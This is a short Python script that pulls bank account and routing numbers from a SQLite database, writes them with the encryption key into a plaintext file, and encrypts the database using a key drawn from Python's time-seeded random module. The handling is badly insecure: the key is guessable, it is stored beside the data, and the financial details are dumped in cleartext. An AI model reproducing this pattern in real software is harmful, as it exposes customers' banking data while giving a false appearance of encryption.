import sqlite3
import random
import time
import pyAesCrypt
import sys

# get name of database
database = sys.argv[1]

# connect to db
conn = sqlite3.connect(database)
cursor = conn.cursor()

# get info
cursor.execute('SELECT account_no FROM orders')
account_nos = cursor.fetchall()
cursor.execute('SELECT routing_no FROM orders')
routing_nos = cursor.fetchall()

# create encryption key
random.seed(time.time())
key = random.randint(200000000000000000000000000000000000000, 300000000000000000000000000000000000000)

# save important info to separate file
with open('account_info.txt', 'w') as f:
    for i,j in enumerate(account_nos):
        f.write(f'account: {j}    routing: {routing_nos[i]}\n')
    f.write(f'\nkey: {key}')

# encrypt the remaining data
pyAesCrypt.encryptFile(database, f'{database}.aes', str(key))

# commit and close connection
conn.commit()
conn.close()
